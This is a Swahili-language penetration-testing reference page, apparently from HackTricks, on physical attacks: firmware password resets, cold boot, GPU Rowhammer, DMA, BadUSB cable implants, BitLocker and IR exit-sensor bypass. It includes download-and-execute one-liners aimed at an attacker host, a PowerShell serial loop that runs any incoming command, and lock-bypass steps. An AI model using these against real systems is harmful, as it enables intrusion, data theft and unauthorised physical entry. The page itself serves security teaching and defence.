# Mashambulizi ya Kimwili

{{#include ../banners/hacktricks-training.md}}

Kwa ugunduzi wa interfaces kwenye kiwango cha board, serial consoles, ufikiaji wa flash, side channels na glitching, tumia [Hardware Hacking](hardware-hacking/README.md) na sura zake zinazohusu interfaces mahususi. Ukurasa huu unahusu mashambulizi yanayohitaji ufikiaji wa kimwili wa mfumo mzima.

## Urejeshaji wa Nenosiri la BIOS na Usalama wa Mfumo

Mipangilio ya firmware ya PC za zamani inaweza kurejeshwa kwa kukata betri ya CMOS au kutumia jumper ya clear-CMOS iliyoandikwa kwenye nyaraka. Muda unaohitajika wa kuzima umeme hutegemea board, na nenosiri au keys za UEFI za kisasa zinaweza kuhifadhiwa kwenye flash isiyopoteza data, embedded controller au kifaa cha usalama, kwa hiyo zinaweza kubaki hata baada ya betri kuondolewa. Angalia mwongozo wa board/service kabla ya kuunganisha pini kwa kifupi; utaratibu huu unaweza pia kubatilisha vipimo vya TPM na kusababisha urejeshaji wa usimbaji wa diski.

Kwenye mifumo ya zamani ya x86, zana kama **killCMOS** na **CmosPwd** zinaweza kukagua au kubadilisha mipangilio inayohifadhiwa kwenye CMOS kutoka kwenye mazingira ya bootable. CmosPwd hutambua miundo ya nenosiri kutoka kwenye seti iliyoandikwa ya familia za BIOS za zamani na inaweza kuhifadhi nakala, kurejesha au kufuta/kuua hali ya CMOS; matoleo yake yaliyochapishwa yanalenga mazingira ya zamani ya DOS/Windows, Linux, FreeBSD na NetBSD.<sup>[[18]](#references)</sup> Zana hizi si viondoaji vya jumla vya nenosiri la UEFI na zinahitaji ufikiaji wa kutosha wa hardware/firmware.

Baadhi ya firmware za laptop huonyesha challenge code maalum ya mtengenezaji baada ya majaribio kadhaa ya nenosiri yaliyoshindikana. Hifadhidata kama [bios-pw.org](https://bios-pw.org) zinaweza kukokotoa nenosiri la urejeshaji la mtengenezaji wa zamani kwa baadhi ya modeli, lakini mifumo mingi huzuia majaribio bila kutoa challenge inayoweza kutumika kukokotoa nenosiri. Chukulia nenosiri lolote linalozalishwa kuwa maalum kwa modeli husika na epuka kufikisha vikomo vya majaribio vya kudumu.

### Usalama wa UEFI

Kwa mifumo ya kisasa ya **UEFI**, CHIPSEC inaweza kukagua ulinzi wa vigezo vya Secure Boot. Anza na ukaguzi usiobadilisha chochote ulio hapa chini; hali ya hiari ya `-a modify` hujaribu kwa makusudi kuharibu vigezo na inapaswa kutumiwa tu kwenye mfumo wa maabara unaoweza kurejeshwa. CHIPSEC yenyewe inaonya kwamba driver yake yenye ruhusa za juu na ufikiaji wa hardware wa kiwango cha chini havifai kwa endpoints za uzalishaji.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Uchambuzi wa RAM na Mashambulizi ya Cold Boot

DRAM haipotezi kila biti mara moja baada ya kusitisha refresh. Kasi ya kupotea kwa data hutofautiana sana kulingana na teknolojia ya moduli na halijoto; kupoza kunaweza kuhifadhi data inayoweza kutumika kwa muda mrefu zaidi kuliko kuzima na kuwasha tena bila kupoza. Shambulio la cold-boot huwasha upya haraka kwenye mazingira madogo ya kupata data au huhamisha moduli iliyopozwa, hunasa kumbukumbu ghafi, na kurejesha funguo za kriptografia licha ya kuharibika kwa biti. Zana ya kunakili diski si lazima iwe zana ya kupata picha ya kumbukumbu halisi, na Volatility huchanganua picha iliyopatikana badala ya kuipata; tumia zana ya kupata data inayofaa jukwaa husika na iliyothibitishwa.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer Dhidi ya Page Tables

Mashambulizi ya kisasa ya GPU Rowhammer yana manufaa zaidi yanapolenga **metadata ya GPU virtual memory** badala ya buffer za kawaida. Utafiti wa hivi karibuni kuhusu **GDDR6 NVIDIA Ampere GPUs** unaonyesha kuwa mshambuliaji anayeendesha msimbo wa CUDA bila upendeleo maalum anaweza kutengeneza mifumo ya hammering maalum kwa GPU, kutumia **memory massaging** kuweka miundo ya paging kwenye safu zilizo hatarini, kisha kubadilisha biti kwenye **last-level page table** au **page directory** ya kati. Mara tu ingizo moja la tafsiri linapoharibika, mshambuliaji anaweza kujenga uwezo wa **kusoma/kuandika kumbukumbu yoyote ya GPU**, kisha kuelekeza shambulio kwenye mfumo mwenyeji.<sup>[[1]](#references)[[2]](#references)</sup>

### Muundo wa Unyonyaji

1. **Tengeneza wasifu wa safu zinazoweza kuhammeriwa** katika GDDR6 na uunde mifumo ya hammering inayozingatia refresh / isiyo sawia ambayo hukwepa kinga za ndani ya DRAM.
2. **Fanya massage ya allocations za GPU** ili driver iweke miundo ya tafsiri ya kurasa katika maeneo halisi yanayoweza kuhammeriwa, badala ya kuiacha kwenye pool chaguomsingi iliyolindwa. Kwa vitendo, hii inaweza kumaanisha kumaliza eneo la kumbukumbu ya chini linalotumika kwa page table na kusambaza mappings kubwa na sparse za UVM zenye stride zinazodhibitiwa.
3. **Badilisha metadata ya tafsiri** kama vile biti za **PFN** au zinazohusiana na aperture ndani ya ingizo la page-table / page-directory, ili ukurasa pepe unaodhibitiwa na mshambuliaji uelekeze kwenye kurasa za page table, kumbukumbu yoyote ya GPU, au mappings za mfumo zinazoonekana kwa host.
4. Tumia tena mapping iliyoghushiwa kuandika upya ingizo zaidi za tafsiri na kuongeza uwezo hadi **kusoma/kuandika kumbukumbu yoyote ya GPU** katika miktadha mbalimbali ya GPU.

### Kuelekeza Shambulio kwa Host na Hatua za Kupunguza Hatari

- **IOMMU ikiwa imezimwa**, mappings za system-aperture zilizoghushiwa zinaweza kufichua **kumbukumbu yoyote halisi ya host** kwa GPU, na kugeuza uwezo huo wa GPU kuwa udukuzi kamili wa host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** hulenga ingizo za last-level page-table, huku **GeForge** ikionyesha kuwa kuharibu kiwango cha page-directory kunaweza kuwa rahisi zaidi kwa sababu kubadilisha biti moja kunaweza kuelekeza upya tawi kubwa la tafsiri. Usichukulie kiwango kimoja tu cha paging kuwa muhimu kwa usalama.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** bado ni muhimu kwa sababu huzuia njia ya moja kwa moja ya kufikia kumbukumbu yoyote ya host inayotumiwa na GDDRHammer/GeForge, lakini **si kinga kamili**. **GPUBreach** inaonyesha hatua ya pili ya kuelekeza shambulio, ambapo mshambuliaji huharibu buffer za CPU zinazoweza kuandikwa na GPU na zinazomilikiwa na driver, kisha huchochea hitilafu za usalama wa kumbukumbu za NVIDIA driver ili kupata uwezo wa kuandika kwenye kernel na **root shell**, hata IOMMU ikiwa imewashwa.<sup>[[3]](#references)</sup>
- **System-level ECC** ni hatua ya vitendo ya kuimarisha usalama kwenye GPU zinazotumika katika workstation/server zinazoiunga mkono. GPU za watumiaji zisizo na ECC zina kinga dhaifu zaidi.<sup>[[4]](#references)</sup>
- Mashambulizi haya si ya kinadharia tu: **GeForge** iliripoti kubadilika kwa biti **1,171** kwenye RTX 3060 na **202** kwenye RTX A6000, kiasi kilichotosha kujenga mnyororo unaofanya kazi wa kuongeza upendeleo kwenye host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Mashambulizi ya Direct Memory Access (DMA)

Kwa ubadilishaji wa offline wa UEFI IFR/NVRAM unaoweza kupunguza utekelezaji wa IOMMU kabla ya kuwasha mfumo na kuwezesha mnyororo wa DMA kwenye Windows, tazama:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** inaonyesha upatikanaji na ubadilishaji wa kumbukumbu unaotegemea **DMA** kupitia miingiliano kama FireWire na usanidi wa awali wa Thunderbolt, ikijumuisha mbinu za kihistoria za kukwepa login. Siyo tu kwamba “haifanyi kazi dhidi ya Windows 10”: uwezekano wa unyonyaji hutegemea kiolesura, build lengwa, sera ya IOMMU, hali ya kufuli, na ikiwa Windows Kernel DMA Protection inaungwa mkono na imewashwa. Windows 10 version 1803 na za baadaye zilianzisha Kernel DMA Protection kwenye mifumo inayooana, na kubadilisha kwa kiasi kikubwa maeneo yanayoweza kushambuliwa.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB kwa Ufikiaji wa Mfumo

Kwenye volume ya Windows ambayo haijasimbwa au ambayo tayari imefunguliwa, mazingira ya offline yanaweza kubadilisha binary za ufikivu kama **sethc.exe** au **Utilman.exe** na kuweka **cmd.exe**, na hivyo kutoa command prompt ya SYSTEM wakati njia ya mkato inayolingana kwenye skrini ya kuingia inapotumiwa. Zana kama **chntpw** zinaweza kuhariri data ya akaunti za ndani ya SAM. Mbinu hizi hazikwepi volume ya BitLocker iliyofungwa na zinaweza kuharibu credentials zinazolindwa na DPAPI/EFS; hifadhi nakala za uchunguzi wa kidijitali na backups.

**Kon-Boot** ni zana ya kibiashara ya kukwepa uthibitishaji wakati wa kuwasha mfumo kwa usanidi wa Windows/macOS unaoungwa mkono. Uoanifu hutegemea OS, hali ya firmware, Secure Boot, na usanidi wa usimbaji wa diski; haiwezi kufungua volume ya BitLocker iliyofungwa.<sup>[[10]](#references)</sup>

---

## Kushughulikia Vipengele vya Usalama vya Windows

### Njia za Mkato za Kuwasha na Urejeshaji

- **Delete/Supr**, F2, F10, au kitufe kingine cha mtengenezaji kinaweza kufungua usanidi wa firmware.
- **F8** hufungua chaguo za uanzishaji wa kina za Windows za zamani tu kwenye usanidi ambao njia hiyo bado imewashwa; njia ya sasa ya kuingia kwenye recovery hutofautiana.
- Kushikilia **Shift** kunaweza kuzuia Windows kuingia kiotomatiki kwenye baadhi ya usanidi, ingawa mipangilio ya sera/registry inaweza kuzima tabia hiyo.<sup>[[17]](#references)</sup>

### Vifaa vya BAD USB

Vifaa kama **USB Rubber Ducky** na board za Teensy vinaweza kujitambulisha kama kibodi za HID zinazoaminika na kuingiza mibonyezo ya vitufe iliyopangwa awali. Payload huanza ikiwa na upendeleo na ufikiaji wa desktop wa kipindi cha mtumiaji aliyeingia; vidokezo vya UAC, kufungwa kwa skrini, mpangilio wa kibodi, muda, na sera ya USB ya endpoint bado huiwekea mipaka.<sup>[[15]](#references)</sup>

Vifaa vya pembeni vinavyoweza kupangwa vinaweza pia kushambulia parser za kernel ya host na kuratibu vifaa kadhaa vya USB kwa ajili ya heap grooming na ufichuaji wa taarifa:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

Upendeleo wa msimamizi au wa backup unaweza kutumika kuunda nakala ya shadow au kuhifadhi registry hives ili kupata faili zilizofungwa kama **SAM** na **SYSTEM**. Hii ni mbinu ya kukusanya data baada ya kuathiri mfumo, si njia ya kukwepa upendeleo, na inapaswa kulinganishwa na matukio ya `diskshadow`/VSS na uhamishaji wa registry hive.

## Mbinu za BadUSB / HID Implant

### Kifaa cha Android HID kinachochochewa na NFC

Simu ya Android iliyofanyiwa root inaweza kuwa kibodi ya USB inayoweza kupangwa tu ikiwa USB controller na kernel yake vina **USB gadget/HID support**. Kwenye vifaa vinavyooana, Kali NetHunter hutoa wasifu wa gadget kupitia **USB Arsenal**. Chaguo jingine ni [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), inayounda kazi za gadget za ConfigFS na inaweza kutoa vifaa vya herufi vya keyboard/mouse kama `/dev/hidg0` na `/dev/hidg1`. Zana hiyo huunda tu endpoint ya gadget; mchakato tofauti lazima uandike HID reports humo. Ufikiaji wa root hauwezi kufidia kernel isiyo na ConfigFS, HID gadget support, au USB Device Controller inayoweza kutumika.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Endpoint hii inaweza kuunganishwa na Android NFC kama kichocheo halisi. Programu ya [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) husoma UID ya tag, huibadilisha kuwa muundo unaotarajiwa, hukagua whitelist ya ndani, kisha hutuma mfuatano wa kibodi uliosanidiwa wa aina ya Rubber Ducky baada ya kuipata kwenye orodha. Host iliyounganishwa huona ingizo la kawaida la kibodi na haihitaji programu ya NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Thibitisha kujitambulisha kwa kifaa na mpangilio wa kibodi kwenye kihariri tupu cha maandishi kabla ya kutumia njia za mkato au amri. Payload isiyo na madhara ni:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Mipaka muhimu ya uaminifu:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **Orodha ya UID zinazoruhusiwa ni utambuzi, si uthibitishaji**. UID ni za umma, na baadhi ya aina za tokeni au emulators huruhusu kunakili au kujifanya kuwa tokeni nyingine. UID iliyoruhusiwa iliyonakiliwa hupitia njia ileile ya uelekezaji kama tokeni asili.
- Moduli ya **NfcScreenOff** ya Magisk hurekebisha huduma ya NFC ili ifanye kazi kana kwamba skrini imewashwa na kufunguliwa. Ikiwa simu tayari imeunganishwa na host, mtu anaweza kuanzisha payload bila kufungua simu.
- Nywila, tokeni za API na amri zilizohifadhiwa kwenye payload ni siri zinazoweza kurejeshwa kwenye kifaa kilicho-rootiwa au ambacho bootloader yake imefunguliwa. Kuingiza nywila kupitia HID ni uendeshaji wa kiotomatiki wa nywila zinazoweza kutumiwa tena, si uthibitishaji usiohitaji nywila.
- Uingizaji wa HID hutumia ruhusa za desktop inayotumika na hutegemea focus, muda na mpangilio wa kibodi wa host. Hitaji uthibitisho wa hivi karibuni wa mtumiaji kabla ya kutekeleza vitendo nyeti, epuka kuweka siri zenye ruhusa za juu kwenye scripts, na tumia kithibitishaji cha challenge-response cha kriptografia kwa uthibitishaji halisi.

### Implants za kebo zinazosimamiwa kupitia Wi-Fi

- Implants za ESP32-S3 kama **Evil Crow Cable Wind** hujificha ndani ya kebo za USB-A→USB-C au USB-C↔USB-C, hujifanya kuwa kibodi ya USB pekee, na hutoa stack yake ya C2 kupitia Wi-Fi. Mwendeshaji anahitaji tu kuwasha kebo kwa umeme kutoka kwa host ya mwathiriwa, kuunda hotspot inayoitwa `Evil Crow Cable Wind` yenye nywila `123456789`, kisha kufungua [http://cable-wind.local/](http://cable-wind.local/) (au anwani yake ya DHCP) ili kufikia kiolesura cha HTTP kilichopachikwa.<sup>[[8]](#references)</sup>
- UI ya kivinjari hutoa vichupo vya *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* na *Config*. Payload zilizohifadhiwa huwekewa lebo kulingana na OS, mipangilio ya kibodi hubadilishwa papo hapo, na mifuatano ya VID/PID inaweza kubadilishwa ili kuiga vifaa vya pembeni vinavyojulikana.
- Kwa kuwa C2 imo ndani ya kebo, simu inaweza kuweka payload, kuanzisha utekelezaji na kudhibiti vitambulisho vya Wi-Fi bila kutumia mtandao wa shirika—jambo linalofaa kwa uvamizi wa kimwili wa muda mfupi.

### Payload za AutoExec zinazotambua OS

- Kanuni za AutoExec huhusisha payload moja au zaidi ili zitekelezwe mara tu baada ya uorodheshaji wa USB. Implant hufanya utambuzi mwepesi wa OS na kuchagua script inayolingana.
- Mtiririko wa kazi wa mfano:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) au `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Kwa kuwa utekelezaji hufanyika bila mtu kuuhudumia, kubadilisha tu kebo ya kuchaji kunaweza kutoa ufikiaji wa awali wa “plug-and-pwn” katika muktadha wa mtumiaji aliyeingia.

### Shell ya mbali inayoanzishwa kupitia HID kwenye Wi-Fi TCP

1. **Uanzishaji wa awali kupitia mibofyo ya vitufe:** Payload iliyohifadhiwa hufungua console na kubandika kitanzi kinachotekeleza chochote kinachowasili kupitia kifaa kipya cha USB serial. Toleo dogo la Windows ni:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Implant hudumisha channel ya USB CDC ikiwa wazi huku ESP32-S3 yake ikizindua TCP client (script ya Python, APK ya Android, au executable ya kompyuta ya mezani) inayounganisha tena na operator. Byte zozote zinazoandikwa kwenye session ya TCP hutumwa kwenye serial loop iliyo hapo juu, na hivyo kuwezesha utekelezaji wa amri kwa mbali hata kwenye hosts zilizotengwa na mtandao. Matokeo ni machache, kwa hiyo operators kwa kawaida huendesha amri bila kuona matokeo (kuunda akaunti, kuweka zana za ziada tayari, n.k.).

### Uso wa HTTP OTA update

- Kiolesura cha Evil Crow Cable Wind kilichoandikwa kwenye nyaraka kina endpoint ya kusasisha firmware kwenye `/update` isiyohitaji uthibitishaji:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Waendeshaji wa field wanaweza kubadilisha vipengele hot-swap (kwa mfano, kuflash firmware ya USB Army Knife) katikati ya operesheni bila kufungua kebo, na hivyo kuruhusu implant kubadili uwezo huku ikiwa bado imechomekwa kwenye host lengwa.

## Kukwepa Usimbaji Fiche wa BitLocker

Upataji wa kiuchunguzi ulioidhinishwa wa mfumo unaotumika au uliokuwa ukiendeshwa hivi karibuni unaweza kuwa na ufunguo mkuu wa volume ya BitLocker au nyenzo nyingine zinazohusiana na funguo wakati volume haijafungwa. Zana za kibiashara kama Elcomsoft Forensic Disk Decryptor na Passware Kit Forensic zinaweza kutafuta kwenye picha za kumbukumbu, faili za hibernation au crash dump zinazotumika, lakini mafanikio hayajahakikishwa. Windows za kisasa pia husimba kwa njia fiche crash dump wakati BitLocker imewashwa, na nenosiri la urejeshaji lenye tarakimu 48 lililohifadhiwa ni aina tofauti ya data na ufunguo wa volume ulio kwenye kumbukumbu.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering ya Kuongeza Recovery Key

Mshambuliaji anayemshawishi msimamizi kutekeleza amri za usimamizi wa BitLocker anaweza kuongeza recovery-password, external-key au protector nyingine, kisha kuichukua. Recovery password haiwezi kuwa mfuatano wowote wa sufuri: recovery password za nambari za BitLocker zina muundo wa tarakimu 48 unaothibitishwa. Sintaksia inayohusika ya usimamizi ulioidhinishwa ni `manage-bde -protectors -add C: -recoverypassword`; orodhesha protectors zilizopo kwa `manage-bde -protectors -get C:`. Fuatilia nyongeza za protector na uhakikishe kuwa nyenzo mpya za urejeshaji zinahifadhiwa kwenye maeneo yaliyoidhinishwa pekee.<sup>[[16]](#references)</sup>

---

## Kutumia Vibaya Swichi za Uingiliaji kwenye Chassis / Matengenezo ili Kurejesha BIOS kwenye Mipangilio ya Kiwandani

Kompyuta mpakato nyingi za kisasa na kompyuta za mezani za small-form-factor zina **swichi ya uingiliaji kwenye chassis** inayofuatiliwa na Embedded Controller (EC) na firmware ya BIOS/UEFI. Ingawa madhumuni yake makuu ni kutoa tahadhari kifaa kinapofunguliwa, wakati mwingine watengenezaji hutekeleza **njia ya mkato ya urejeshaji isiyoandikwa kwenye nyaraka**, ambayo huanzishwa swichi inapobadilishwa kulingana na mpangilio maalum.<sup>[[5]](#references)[[6]](#references)</sup>

### Jinsi Shambulio Linavyofanya Kazi

1. Swichi imeunganishwa kwenye **interrupt ya GPIO** kwenye EC.
2. Firmware inayoendeshwa kwenye EC hufuatilia **muda na idadi ya mibofyo**.
3. Mpangilio uliowekwa moja kwa moja kwenye firmware unapotambuliwa, EC huita utaratibu wa *mainboard-reset* unaofuta **yaliyomo kwenye system NVRAM/CMOS**.
4. Kwenye kuwasha upya kunakofuata, modeli zilizoathiriwa hupakia hali ya firmware iliyorejeshwa. Kulingana na mtengenezaji na toleo, hali iliyofutwa inaweza kujumuisha nenosiri la msimamizi, mipangilio maalum ya kuwasha au funguo za Secure Boot zilizosajiliwa; hali ya TPM na athari za usimbaji fiche wa diski lazima zichunguzwe kando.

> Kurejesha firmware kunaweza kuwezesha tena chaguo za kuwasha kutoka kwenye vifaa vya nje, lakini **hakusimbui hifadhi kwa njia ya kuifungua**. BitLocker au mfumo mwingine wa usimbaji fiche wa diski nzima unaweza kuingia kwenye hali ya urejeshaji baada ya mabadiliko ya TPM/firmware na bado kulinda diski ya ndani bila recovery key.<sup>[[16]](#references)</sup>

### Mfano Halisi – Kompyuta Mpakato ya Framework 13

Njia ya mkato ya urejeshaji ya Framework 13 (kizazi cha 11/12/13) ni:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Baada ya mzunguko wa kumi, EC huweka alama inayoagiza BIOS kufuta NVRAM wakati wa kuwasha upya kunakofuata. Utaratibu mzima huchukua takriban sekunde 40 na **hauhitaji chochote zaidi ya bisibisi**.<sup>[[5]](#references)</sup>

### Utaratibu wa Jumla wa Exploitation

1. Washa kifaa au kisimamishe kisha ukirudishe kwenye hali ya kufanya kazi ili EC iwe inaendesha.
2. Ondoa kifuniko cha chini ili ufikie swichi ya intrusion/maintenance.
3. Rudia mpangilio wa kuwasha na kuzima swichi maalum wa mtengenezaji (angalia nyaraka, mijadala ya mtandaoni, au fanya reverse-engineer ya EC firmware).
4. Kikusanye tena na uwashe upya, kisha kagua ni mipangilio ipi ya firmware na vitambulisho vya kuingia vilivyobadilika kwa hakika.
5. Ikiwa umeidhinishwa na uanzishaji kutoka kifaa cha nje unawezekana, washa mfumo kutoka kwenye live image inayodhibitiwa. Mara tu volume ya ndani inapofunguliwa kihalali (au ikiwa haikuwahi kusimbwa kwa njia fiche), mazingira ya live yanaweza kupata vitambulisho vya kuingia na data au kukagua EFI System Partition. Kurekebisha partition hiyo ili kusakinisha EFI implant ni hatua ya kudumu na yenye athari kubwa, na bado huzuiwa na Secure Boot, measured boot, ulinzi wa uandishi wa firmware na ufuatiliaji wa endpoint. Hifadhi iliyosimbwa kwa njia fiche hubaki kutoweza kufikiwa bila ufunguo wake au maelezo ya urejeshaji.

### Ugunduzi na Kupunguza Hatari

* Rekodi matukio ya kufunguliwa kwa chasisi kwenye dashibodi ya usimamizi wa OS na uyalinganishe na mipangilio ya BIOS iliyowekwa upya bila kutarajiwa.
* Tumia **mihuri inayoonyesha dalili za kuguswa** kwenye skrubu/vifuniko ili kugundua kufunguliwa.
* Weka vifaa katika **maeneo yanayodhibitiwa kimwili**; chukulia kwamba ufikiaji wa kimwili ni sawa na kifaa kuathiriwa kikamilifu.
* Ikiwezekana, zima kipengele cha mtengenezaji cha “maintenance switch reset” au hitaji idhini ya ziada ya kriptografia kwa ajili ya kuweka upya NVRAM.

---

## Kudunga IR Kisiri Dhidi ya Vihisi vya Kutoka Visivyohitaji Mguso

### Sifa za Kihisi
- Vihisi vya kawaida vya “wave-to-exit” huunganisha kisambaza mwanga cha karibu na IR na moduli ya kipokezi inayofanana na ile ya rimoti ya TV; moduli hiyo hutoa kiwango cha juu cha mantiki baada tu ya kupokea mipigo mingi (~4–10) ya carrier sahihi (≈30 kHz).<sup>[[7]](#references)</sup>
- Kifuniko cha plastiki huzuia kisambaza na kipokezi kutazamana moja kwa moja, kwa hiyo kidhibiti hudhani kwamba carrier yoyote iliyothibitishwa ilitokana na mwangaza uliorudishwa kutoka eneo la karibu, kisha huendesha relay inayofungua kufuli la mlango.
- Kidhibiti kinapoamini kwamba kuna lengo, mara nyingi hubadilisha umbo la modulation inayotumwa, lakini kipokezi huendelea kukubali mlipuko wowote unaolingana na carrier iliyochujwa.

### Mchakato wa Shambulio
1. **Nasa wasifu wa utoaji wa mawimbi** – unganisha logic analyser kwenye pini za kidhibiti ili kurekodi miundo ya mawimbi ya kabla na baada ya kutambua, inayoendesha LED ya ndani ya IR.
2. **Rudia tu muundo wa mawimbi wa “baada ya kutambua”** – ondoa/puuza kisambaza mawimbi cha kawaida na uendeshe LED ya nje ya IR kwa kutumia muundo ambao tayari umewashwa tangu mwanzo. Kwa kuwa kipokezi huzingatia idadi/marudio ya mipigo pekee, huchukulia carrier bandia kuwa mwangaza halisi uliorudishwa na kuwasha laini ya relay.
3. **Dhibiti muda wa utumaji** – tuma carrier kwa mipasuko iliyopangwa (kwa mfano, iwashwe kwa makumi ya milisekunde kisha izimwe kwa muda unaokaribiana) ili kutoa idadi ya chini kabisa ya mipigo bila kuizidishia AGC ya kipokezi au mantiki yake ya kushughulikia mwingiliano. Utumaji endelevu hupunguza haraka unyeti wa kihisi na kuzuia relay kuwashwa.

### Udungaji wa Mwangaza Uliorudishwa kutoka Umbali Mrefu
- Kubadilisha LED ya majaribio na diode ya IR yenye nguvu ya juu, kiendeshi cha MOSFET na optiki za kulenga huwezesha kuwasha kihisi kwa uhakika kutoka umbali wa takriban mita 6.
- Mshambulizi hahitaji kuwa na mwonekano wa moja kwa moja wa tundu la kipokezi; kuelekeza mwangaza kwenye kuta za ndani, rafu au fremu za milango zinazoonekana kupitia kioo huruhusu nishati iliyorudishwa kuingia kwenye eneo la mwonekano la ~30° na kuiga kutikisa mkono karibu na kihisi.
- Kwa kuwa vipokezi hutazamia mwangaza hafifu tu uliorudishwa, mwangaza wenye nguvu zaidi kutoka nje unaweza kuruka kati ya nyuso kadhaa na bado kuzidi kiwango cha chini cha utambuzi.

### Tochi ya Shambulio Iliyobadilishwa

- Kuficha kiendeshi ndani ya tochi ya kawaida ya dukani hufanya kifaa kisitilie shaka. Badilisha LED inayoonekana na LED ya IR yenye nguvu ya juu inayolingana na masafa ya kipokezi, ongeza ATtiny412 (au kifaa sawa) ili itengeneze mipasuko ya ≈30 kHz, na utumie MOSFET kupitisha mkondo wa LED.
- Lenzi ya kukuza inayoweza kurefushwa hukazia mwangaza kwa umbali/usahihi, huku motor ya mtetemo inayodhibitiwa na MCU ikitoa uthibitisho wa kugusa kwamba modulation inafanya kazi bila kutoa mwanga unaoonekana.
- Kubadilishana kati ya miundo kadhaa ya modulation iliyohifadhiwa (masafa ya carrier na maumbo ya mawimbi tofauti kidogo) huongeza uoanifu na familia mbalimbali za vihisi vilivyopewa majina mapya, na kumwezesha mtumiaji kuelekeza mwangaza kwenye nyuso zinazorudisha mwanga hadi relay isikike ikiwashwa na mlango kufunguka.

---

## References

- [1] [GDDRHammer: Kuvuruga Sana Safu za DRAM — Mashambulizi ya Rowhammer Kati ya Vipengele kutoka kwa GPU za Kisasa](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Kufanya Hammering kwenye Kumbukumbu ya GDDR ili Kutengeneza Majedwali ya Kurasa za GPU kwa Burudani na Faida](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Mashambulizi ya Kupandisha Haki za Ufikiaji kwenye GPU kwa kutumia Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Tangazo la Usalama: Rowhammer - Julai 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Bonyeza hapa ili kupenyeza”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mwongozo wa Kuweka Upya Mainboard](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Hapanaaaaaa Kugusa! – Kukwepa Vihisi vya Kutoka vya IR Visivyohitaji Mguso kwa Tochi Fichika ya IR”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Chomeka, Cheza, Pwn: Kudukua kwa kutumia Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Shambulio la Rowhammer Dhidi ya Chipu za NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Nyaraka rasmi za Kon-Boot na maelezo ya uoanifu](https://kon-boot.com/)
- [11] [Nyaraka za CHIPSEC - Ulinzi wa vigezo vya Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Tusisahau: Mashambulizi ya Cold Boot dhidi ya Funguo za Usimbaji Fiche](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - udanganyifu wa kumbukumbu halisi kupitia DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Ulinzi wa Kernel DMA](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Nyaraka za Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Mwongozo wa uendeshaji wa BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - tabia ya kushikilia Shift na kuingia kiotomatiki](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Nyaraka na vipakuliwa vya CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Nyaraka za Kali Linux - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Nyaraka za Linux kernel - Kiendeshi cha USB HID gadget](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Geuza Simu ya Android Iliyofanyiwa Root kuwa Kithibitishaji cha NFC na Zana ya Uendeshaji Kiotomatiki kwa Kompyuta Yako](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
